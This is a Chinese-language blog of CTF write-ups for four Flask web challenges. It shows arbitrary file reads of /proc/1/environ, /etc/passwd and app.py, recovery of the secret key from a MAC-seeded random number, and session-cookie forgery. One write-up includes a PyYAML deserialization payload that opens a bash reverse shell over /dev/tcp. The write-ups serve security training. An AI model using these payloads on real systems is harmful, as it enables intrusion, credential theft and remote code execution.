+<h1 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h1><p>1分<br>反序列化PythonCookie伪造<br>题目描述</p>
+<p>I wanna eat some yummy food :(<br>can you give me some?<br>一进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome to HDCTF2023 Read somethings</span><br><span class="line">Here is the challenge Upload file</span><br><span class="line">Enjoy it pwd</span><br></pre></td></tr></table></figure>
+<p>这三行点进去分别对应了三个链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28927/read?url=https://baidu.com</span><br><span class="line">http://node4.anna.nssctf.cn:28927/upload</span><br><span class="line">http://node4.anna.nssctf.cn:28927/pwd</span><br></pre></td></tr></table></figure>
+<p>第一个进去是一个百度页面<br>第二个是文件上传页面<br>第三个是显示一个&#x2F;app<br>这个第一个一看就很像那很可以任意文件读取的漏洞<br>非预期直接读环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28927/read?url=file:///proc/1/environ</span><br></pre></td></tr></table></figure>
+<p>要是预期解的话，思路只能是先试试能不能读取一些有用的文件，肯定不能上来就文件上传<br>但是剩下的思路也不太好想到，这里我们看wp的。我们肯定是要读文件，又告诉你了&#x2F;app，那么读app&#x2F;app.py也是合理的了<br>但是这里直接读是不可以的<br>这里选择在hackbar对其进行两次url编码，这里可能就需要一点经验之类的了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?url=file:///app/app.py</span><br></pre></td></tr></table></figure>
+<p>选择app&#x2F;app.py并且选择all字符都编码（不止局限于空格符号等等了）<br>读到了我们的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re, random, uuid</span><br><span class="line">from flask import *</span><br><span class="line">from werkzeug.utils import *</span><br><span class="line">import yaml</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)</span><br><span class="line">app.debug = False</span><br><span class="line">BLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]</span><br><span class="line">app.config[&#x27;UPLOAD_FOLDER&#x27;]=&quot;/app/uploads&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;passport&#x27;] = &#x27;YamiYami&#x27;</span><br><span class="line">    return &#x27;&#x27;&#x27;</span><br><span class="line">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">@app.route(&#x27;/pwd&#x27;)</span><br><span class="line">def pwd():</span><br><span class="line">    return str(pwdpath)</span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(&#x27;url&#x27;)</span><br><span class="line">        m = re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)</span><br><span class="line">        if m:</span><br><span class="line">            return &quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br><span class="line">        if n:</span><br><span class="line">            return &quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        return res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(str(ex))</span><br><span class="line">    return &#x27;no response&#x27;</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">   for blackstr in BLACK_LIST:</span><br><span class="line">       if blackstr in filename:</span><br><span class="line">           return False</span><br><span class="line">   return True</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if &#x27;file&#x27; not in request.files:</span><br><span class="line">            flash(&#x27;No file part&#x27;)</span><br><span class="line">            return redirect(request.url)</span><br><span class="line">        file = request.files[&#x27;file&#x27;]</span><br><span class="line">        if file.filename == &#x27;&#x27;:</span><br><span class="line">            return &quot;Empty file&quot;</span><br><span class="line">        if file and allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            if not os.path.exists(&#x27;./uploads/&#x27;):</span><br><span class="line">                os.makedirs(&#x27;./uploads/&#x27;)</span><br><span class="line">            file.save(os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename))</span><br><span class="line">            return &quot;upload successfully!&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line">@app.route(&#x27;/boogipop&#x27;)</span><br><span class="line">def load():</span><br><span class="line">    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:</span><br><span class="line">        LoadedFile=request.args.get(&quot;file&quot;)</span><br><span class="line">        if not os.path.exists(LoadedFile):</span><br><span class="line">            return &quot;file not exists&quot;</span><br><span class="line">        with open(LoadedFile) as f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        return &quot;van you see&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;No Auth bro&quot;</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    pwdpath = os.popen(&quot;pwd&quot;).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=False,</span><br><span class="line">        host=&quot;0.0.0.0&quot;</span><br><span class="line">    )</span><br><span class="line">    print(app.config[&#x27;SECRET_KEY&#x27;])</span><br></pre></td></tr></table></figure>
+<p>这里是一段py代码<br>需要做的事情就两件，因为提示在&#x2F;boogipop做坏事<br>那就需要伪造session,yaml反序列化<br>前提知识：<br>在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode()<br>方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。<br>那么&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，这个就是网卡的位置，读取他进行伪造即可。<br>具体方法如下，先用file协议读取网卡mac地址，再利用脚本进行解密、修改和加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>
+<p>读到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:56:c9 </span><br></pre></td></tr></table></figure>
+<p>使用我们的脚本就可以读到key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#02:42:ac:02:45:95</span><br><span class="line">import random</span><br><span class="line">random.seed(0x0242ac024595)</span><br><span class="line">print (str(random.random()*233))</span><br><span class="line">#134.93839228759927 #secret_key</span><br><span class="line">#python main.py decode -s 231.28194338656192 -c &quot;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn</span><br><span class="line">0.ZETklg.pEPhZ5o8PxJOT7pLSFqlhNV28EQ&quot; #解密</span><br><span class="line">#python session.py encode -s 134.93839228759927 -t &quot;&#123;&#x27;passport&#x27;:&#x27;Welcome To HDCTF2023&#x27;&#125;&quot; #加密</span><br></pre></td></tr></table></figure>
+<p>{‘passport’: ‘Welcome To HDCTF<br>2023’}这个是代码告诉你的了<br>231.28194338656192是我们生成的key<br>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">─# python session.py encode -s 176.89627685622764 -t &quot;&#123;&#x27;passport&#x27;:&#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.aHZMog.KeB2VJ9lVXmW0itBKdbnuv21B54</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+<p>第二步就是反弹shell，这里需要用到我们的这个yaml反序列化知识。这个我是真的不知道<br>后面再遇见的话，再出一个专题好好做一下<br>这里就按着wp抄</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- !!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/29964 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">    - !!python/object/new:staticmethod</span><br><span class="line">      args: [0]</span><br><span class="line">      state:</span><br><span class="line">        update: !!python/name:exec</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>命名为1.txt上传<br>然后我们开始监听<br>再访问&#x2F;boogipop?file&#x3D;uploads&#x2F;1.txt<br>发现不行<br>这里访问的时候我们选择抓包，改我们的cookie<br>这里还有一个小的要注意的地方，就是我们的这个直接访问的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28927/boogipop?file=uploads/1.txt</span><br></pre></td></tr></table></figure>
+<p>一开始是不带cookie的，我们先访问一下其他的页面等等<br>但是还是没有出<br>这个我没有出<br>多半是环境有问题，我应该是没有问题的<br>你看，别人在bp这一步抓的包</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-15%20203235.png?raw=true"></p>
+<p>还有别人f12看到的</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-15%20204824.png?raw=true"></p>
+<p>但是我的请求的永远的要比他们少一个参数，我手写也不可以</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-15%20204858.png?raw=true"></p>
+<p>可以对比第一张和第三长图<br>我去反复检查了下自己的错误，应该是没有问题的</p>
+<h1 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h1><p>1分<br>Cookie伪造FlaskPython<br>这里要做的信息搜集不只是扫一下目录，当然，这个是ctf赛题，还是很需要考我们的像脑筋急转弯了<br>我们在找回密码页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>
+<p>这个告诉你flask了，感觉就很接近我们的思路了<br>原本我是想着能不能爆破出来密码什么的，我去注册账号的时候，发现admin被注册了<br>这里就不能选择使用我们的cyberchef了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager/tree/master</span><br></pre></td></tr></table></figure>
+<p>这里是我们的一个开源项目<br>使用的方法其实和我们之前在kail里面的一样<br>encode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure>
+<p>decode,with secret key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<p>without secret key </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span><br><span class="line">&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们已经得到密钥了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session.py decode -c &#x27;.eJwlzjsSwjAMANG7uKaQZVmWc5mM9RtoE1Ix3B0Gmq22eK-y5xHnvWzP44pb2R9ettJSciqAGfUUSmInDhrBBq0PdGxsKxU99Bu0TK0NGmlXNDeACTCG_fbqzBwT05blrLkmylKpJmkmbUo3jxZkjqS8JAjKF3Kdcfw1WN4fJdowsQ.aHdfsg.IxgAGLY3JBHdV5mrjewumk1AGQo&#x27; -s &#x27;th3f1askisfunny&#x27;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# python3 session.py decode -c &#x27;.eJwlzjsSwjAMANG7uKaQZVmWc5mM9RtoE1Ix3B0Gmq22eK-y5xHnvWzP44pb2R9ettJSciqAGfUUSmInDhrBBq0PdGxsKxU99Bu0TK0NGmlXNDeACTCG_fbqzBwT05blrLkmylKpJmkmbUo3jxZkjqS8JAjKF3Kdcfw1WN4fJdowsQ.aHdfsg.IxgAGLY3JBHdV5mrjewumk1AGQo&#x27; -s &#x27;th3f1askisfunny&#x27;</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们这里把2改为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session.py encode -s &#x27;th3f1askisfunny&#x27; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;3f8f9b00cc45f84f46d46e47e6c03572d236cafb2debb2d2cffb13034b5b2cdc0090077c6c0351d666e92fcacf91fa928ab81c8fcc83985cde3e4cd24b6a8e40&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>这个思路还是很简单的，一下子就出来flag了</p>
+<h1 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h1><p>88分<br>Cookie伪造FlaskPython<br>一进来，有一个任意文件读写的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28942/read?url=https://baidu.com</span><br></pre></td></tr></table></figure>
+<p>这里我们读取&#x2F;etc&#x2F;passwd，发现存在读取漏洞<br>我们可以尝试读取&#x2F;proc&#x2F;self&#x2F;cmdline读取当前进程对应的终端命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28942/read?url=/proc/self/cmdline</span><br><span class="line">/usr/local/bin/python/app/app.py</span><br></pre></td></tr></table></figure>
+<p>然后我们读取app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">import re, random, uuid, urllib</span><br><span class="line">from flask import Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)</span><br><span class="line">app.debug = True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;username&#x27;] = &#x27;www-data&#x27;</span><br><span class="line">    return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(&#x27;url&#x27;)</span><br><span class="line">        m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)</span><br><span class="line">        if m or n:</span><br><span class="line">            return &#x27;No Hack&#x27;</span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        return res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print str(ex)</span><br><span class="line">    return &#x27;no response&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;)</span><br><span class="line">def flag():</span><br><span class="line">    if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;:</span><br><span class="line">        return open(&#x27;/flag.txt&#x27;).read()</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Access denied&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=True,</span><br><span class="line">        host=&quot;0.0.0.0&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>主要就是要我们伪造session的username从www-data到fuck<br>这里又和前面的题目很像了，我们可以读取服务器的mac地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28942/read?url=/sys/class/net/eth0/address</span><br><span class="line">02:42:ac:02:58:6e </span><br></pre></td></tr></table></figure>
+<p>然后我们可以利用脚本计算出scret_key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">mac = &quot;02:42:ac:02:41:40&quot;</span><br><span class="line">mac = int(mac.replace(&quot;:&quot;, &quot;&quot;), 16)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*233)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure>
+<p>这个脚本比上面的脚本要方便一点<br>这里可能就是说，我们需要解密先一下，当然，这里的比较简单，是那种，前面一段可以直接找到是什么的，然后我们进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 session2.py encode -s 67.3129965665562 -t &quot;</span><br><span class="line">&#123;&#x27;username&#x27;:b&#x27;fuck&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>这个是复现不了了，抓包还是一样，后面少了一个参数。最后我们发现，是要用到python2的环境来可以的<br>我们把上面的指令换成2再来试试<br>但是我在运行这个py2的文件的时候，发现报错说什么的<br>这里我们更换了脚本，将上面所提到的py2的脚本放入了kail<br>可能很多人的kail的运行安装这个脚本都是有问题的<br>但是和之间pyckle一样，还是有问题。前面的都是没有什么大的问题的，但是有一个小的问题<br>后面终于找到了</p>
+<h1 id="生成key的时候环境和session都是要py2的环境"><a href="#生成key的时候环境和session都是要py2的环境" class="headerlink" title="生成key的时候环境和session都是要py2的环境"></a>生成key的时候环境和session都是要py2的环境</h1><p>之前我们的这个生成session改为py2的环境了<br>但是生成key的时候也要py2的环境<br>我们将脚本放入kail命名为key.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 key.py</span><br></pre></td></tr></table></figure>
+<p>发现生成。再运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 session2.py encode -s 67.3129965666 -t &quot;</span><br><span class="line">&#123;&#x27;username&#x27;:b&#x27;fuck&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>最后把得到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aHd_uQ.Px6pGHDFovaJBtUpwWUth3fmD-M</span><br></pre></td></tr></table></figure>
+<p>放入session，再访问&#x2F;flag<br>最后就出flag了</p>
+<h1 id="NSSRound-13-Basic-flask-jwt-hard"><a href="#NSSRound-13-Basic-flask-jwt-hard" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?(hard)"></a>[NSSRound#13 Basic]flask?jwt?(hard)</h1><p>146分<br>Cookie伪造FlaskPython<br>和之前的拿到题目基本是一样的，不一样的地方是我们这次不能直接访问找回密码的地方来拿到flag了<br>我们这里先注册账号、登陆进去<br>发现有我们的这个点击拿到flag的页面，这里我们就可以知道多半是伪造session的这么一个页面了<br>这里使用ctrl+u得到网页源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   你好 ,1</span><br><span class="line">        &lt;a href=&quot;/getFlag&quot;&gt; &lt;br&gt;</span><br><span class="line">        &lt;button&gt;拿 flag&lt;/button&gt;&lt;/a&gt;</span><br><span class="line">&lt;!-- 我der密钥去哪里了，哦！源来氏被 /wor 藏起来了 --&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>访问&#x2F;wor，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哼，我不会告诉你我藏哪里了，但是不能什么都不跟你说吧？哎，告诉你上次的登录时间吧: 2025-07-16 10:41:51+00:00</span><br></pre></td></tr></table></figure>
+<p>接下来的思路又是第一次见了<br>我们找到session的部分，随便删掉几个，就会报错<br>接下来就是像ssti输入pin码的这个地方了<br>然后这里面就可以找到key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hardgam3_C0u1d_u_f1ndM3????</span><br></pre></td></tr></table></figure>
+<p>之前我们可以注意到，是要访问&#x2F;getFlag才能拿到flag的<br>最后就用py3的解密，然后再修改，拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 session3.py decode -c &#x27;.eJwljjuKAzEQBa8iOnbQarU0ki6wsLCZwaGR-sMadpOxJzK-u8d2UvCKF9Qdzr7a9Rf6bd3sAOeLQofk1dtEFOHslZ2LcjFerAimvJBSKjJ8ktrcQeI-Y8LEM08SFcSGuCzyvkctpVgjlyHeoo9GdcwapbpITa1mUUvGosSzjGqMsIdsV1s_NbTP2-XfoN8hvMTJ9BBiCd_bXyCkHCL2nDpx-Po5wuPxBPFiPBo.aHeEpA.JRbUMOZoVbV2YvCQHy3V-3j2AHw&#x27; -s &#x27;hardgam3_C0u1d_u_f1ndM3????&#x27;</span><br></pre></td></tr></table></figure>
+<p>result</p>
